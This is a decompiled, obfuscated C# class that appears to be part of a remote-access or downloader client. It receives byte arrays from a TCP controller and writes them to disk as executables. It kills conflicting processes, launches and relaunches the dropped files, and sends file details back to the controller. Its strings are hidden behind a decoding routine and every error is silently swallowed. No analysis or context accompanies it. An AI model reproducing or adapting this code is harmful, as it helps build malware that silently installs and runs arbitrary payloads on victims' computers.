using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public sealed class GClass1
{
	public GClass2 gclass2_0;

	public DateTime dateTime_0;

	public GClass1(GClass2 gclass2_1)
	{
		gclass2_0 = gclass2_1;
	}

	public void method_0(int int_0)
	{
		try
		{
			Process.GetProcessById(int_0).Kill();
			Thread.Sleep(10);
		}
		catch
		{
		}
	}

	public void method_1()
	{
		DateTime now = DateTime.Now;
		try
		{
			if (Math.Abs(dateTime_0.Subtract(now).Minutes) > 6)
			{
				gclass2_0.tcpClient_0.Close();
				gclass2_0.bool_6 = false;
			}
		}
		catch
		{
		}
	}

	public void method_2()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(Class6.string_7);
			if (processesByName.Length == 1)
			{
				method_0(processesByName[0].Id);
			}
			Thread.Sleep(50);
			if (File.Exists(Class6.smethod_5() + Class6.string_7))
			{
				File.Delete(Class6.smethod_5() + Class6.string_7);
				string text = Class6.smethod_5();
				string string_ = Class6.string_7;
				char[] separator = new char[1] { '|' };
				if (File.Exists(text + string_ + Class11.smethod_0(-2094343270).Split(separator)[0]))
				{
					string text2 = Class6.smethod_5();
					string string_2 = Class6.string_7;
					separator = new char[1] { '|' };
					File.Delete(text2 + string_2 + Class11.smethod_0(-2094343270).Split(separator)[0]);
				}
				Thread.Sleep(150);
				method_9();
			}
		}
		catch
		{
		}
	}

	public void method_3(string string_0)
	{
		try
		{
			Process.Start(string_0);
		}
		catch
		{
		}
	}

	public void method_4(string string_0, string string_1, GForm0 gform0_0)
	{
		try
		{
			byte[] array = gclass2_0.method_11();
			if (string_0 == null)
			{
				return;
			}
			if (string_0 == Class11.smethod_0(-2094343253))
			{
				if (array != null)
				{
					File.WriteAllBytes(Class6.smethod_2() + Class6.string_6, array);
				}
			}
			else if (string_0 == Class11.smethod_0(-2094343236))
			{
				if (array != null)
				{
					if (!Directory.Exists(Class6.smethod_5()))
					{
						Directory.CreateDirectory(Class6.smethod_5());
					}
					Process[] processesByName = Process.GetProcessesByName(Class6.string_7);
					if (processesByName.Length == 1)
					{
						method_0(processesByName[0].Id);
					}
					File.WriteAllBytes(Class6.smethod_5() + Class6.string_7 + Class11.smethod_0(-2094343231), array);
				}
			}
			else if (string_0 == Class11.smethod_0(-2094343204) || string_0 == Class11.smethod_0(-2094343194))
			{
				if (!Directory.Exists(Class6.smethod_8()))
				{
					Directory.CreateDirectory(Class6.smethod_8());
				}
				if (array != null)
				{
					Process[] processesByName2 = Process.GetProcessesByName(Class6.string_18);
					if (processesByName2.Length == 1)
					{
						method_0(processesByName2[0].Id);
					}
					string text = Class6.smethod_8();
					string string_2 = Class6.string_18;
					char[] separator = new char[1] { '!' };
					File.WriteAllBytes(text + string_2 + Class11.smethod_0(-2094343416).Split(separator)[0], array);
				}
			}
			else if (string_0 == Class11.smethod_0(-2094343396) && array != null)
			{
				if (!Directory.Exists(Class6.smethod_3()))
				{
					Directory.CreateDirectory(Class6.smethod_3());
				}
				string text2 = Class6.smethod_3();
				string string_3 = Class6.string_5;
				char[] separator = new char[1] { '!' };
				File.WriteAllBytes(text2 + string_3 + Class11.smethod_0(-2094343416).Split(separator)[0], array);
			}
		}
		catch
		{
		}
	}

	public string method_5(string string_0, bool bool_0)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(string_0);
			string name = fileInfo.Name;
			string text;
			if (!bool_0)
			{
				char[] separator = new char[1] { '|' };
				text = Class11.smethod_0(-2094343391).Split(separator)[0];
			}
			else
			{
				char[] separator = new char[1] { '|' };
				text = Class11.smethod_0(-2094343370).Split(separator)[0];
			}
			string text2 = name + text;
			string text3 = text2;
			string text4 = fileInfo.CreationTimeUtc.ToString();
			string text5;
			if (!bool_0)
			{
				char[] separator = new char[1] { '|' };
				text5 = Class11.smethod_0(-2094343391).Split(separator)[0];
			}
			else
			{
				char[] separator = new char[1] { '|' };
				text5 = Class11.smethod_0(-2094343370).Split(separator)[0];
			}
			text2 = text3 + text4 + text5;
			string text6 = text2;
			string text7 = method_6(fileInfo.Length);
			string text8;
			if (!bool_0)
			{
				char[] separator = new char[1] { '|' };
				text8 = Class11.smethod_0(-2094343391).Split(separator)[0];
			}
			else
			{
				char[] separator = new char[1] { '|' };
				text8 = Class11.smethod_0(-2094343370).Split(separator)[0];
			}
			text2 = text6 + text7 + text8;
			if (!bool_0)
			{
				GClass2 gClass = gclass2_0;
				char[] separator = new char[1] { '|' };
				gClass.method_12(null, Class11.smethod_0(-2094343353).Split(separator)[0] + text2, bool_8: false);
			}
			return text2;
		}
		catch
		{
			return string.Empty;
		}
	}

	public string method_6(long long_0)
	{
		try
		{
			string[] array = new string[7];
			char[] separator = new char[1] { '!' };
			array[0] = Class11.smethod_0(-2094343321).Split(separator)[0];
			separator = new char[1] { '!' };
			array[1] = Class11.smethod_0(-2094343308).Split(separator)[0];
			separator = new char[1] { '!' };
			array[2] = Class11.smethod_0(-2094343526).Split(separator)[0];
			array[3] = Class11.smethod_0(-2094343512);
			array[4] = Class11.smethod_0(-2094343519);
			array[5] = Class11.smethod_0(-2094343490);
			separator = new char[1] { '!' };
			array[6] = Class11.smethod_0(-2094343497).Split(separator)[0];
			string[] array2 = array;
			if ((ulong)long_0 > 0uL)
			{
				long num = Math.Abs(long_0);
				int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
				double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
				return (double)Math.Sign(long_0) * num3 + array2[num2];
			}
			return Class11.smethod_0(-2094343483) + array2[0];
		}
		catch
		{
			return string.Empty;
		}
	}

	public NetworkStream method_7(TcpClient tcpClient_0)
	{
		return tcpClient_0.GetStream();
	}

	public void method_8()
	{
		try
		{
			byte[] array = gclass2_0.method_11();
			if (array != null)
			{
				string text = Class6.smethod_2();
				string string_ = Class6.string_16;
				char[] separator = new char[1] { '!' };
				if (!File.Exists(text + string_ + Class11.smethod_0(-2094343416).Split(separator)[0]))
				{
					string text2 = Class6.smethod_2();
					string string_2 = Class6.string_16;
					separator = new char[1] { '!' };
					File.WriteAllBytes(text2 + string_2 + Class11.smethod_0(-2094343416).Split(separator)[0], array);
					method_3(Class6.smethod_2() + Class6.string_16 + Class11.smethod_0(-2094343231).ToString());
				}
			}
		}
		catch
		{
		}
	}

	public void method_9()
	{
		try
		{
			if (Process.GetProcessesByName(Class6.string_7).Length == 0)
			{
				string empty = string.Empty;
				string text = Class6.smethod_5();
				string string_ = Class6.string_7;
				char[] separator = new char[1] { '!' };
				empty = text + string_ + Class11.smethod_0(-2094343416);
				if (File.Exists(empty.Split(separator)[0]))
				{
					string text2 = Class6.smethod_5();
					string string_2 = Class6.string_7;
					separator = new char[1] { '!' };
					method_3(text2 + string_2 + Class11.smethod_0(-2094343416).Split(separator)[0].ToString());
				}
			}
		}
		catch
		{
		}
	}

	public void method_10()
	{
		try
		{
			if (Process.GetProcessesByName(Class6.string_18).Length == 0)
			{
				string text = Class6.smethod_8();
				string string_ = Class6.string_18;
				char[] separator = new char[1] { '!' };
				if (File.Exists(text + string_ + Class11.smethod_0(-2094343416).Split(separator)[0]))
				{
					string text2 = Class6.smethod_8();
					string string_2 = Class6.string_18;
					separator = new char[1] { '!' };
					method_3(text2 + string_2 + Class11.smethod_0(-2094343416).Split(separator)[0]);
				}
			}
		}
		catch
		{
		}
	}

	public void method_11()
	{
		try
		{
			if (Process.GetProcessesByName(Class6.string_18).Length == 0)
			{
				string text = Class6.smethod_8();
				string string_ = Class6.string_18;
				char[] separator = new char[1] { '!' };
				if (File.Exists(text + string_ + Class11.smethod_0(-2094343416).Split(separator)[0]))
				{
					string text2 = Class6.smethod_8();
					string string_2 = Class6.string_18;
					separator = new char[1] { '!' };
					method_3(text2 + string_2 + Class11.smethod_0(-2094343416).Split(separator)[0].ToString());
				}
			}
		}
		catch
		{
		}
	}

	public string[] method_12()
	{
		string @string = Encoding.UTF8.GetString(Class6.byte_0, 0, Class6.byte_0.Length);
		return @string.Split(new char[1] { '?' });
	}
}
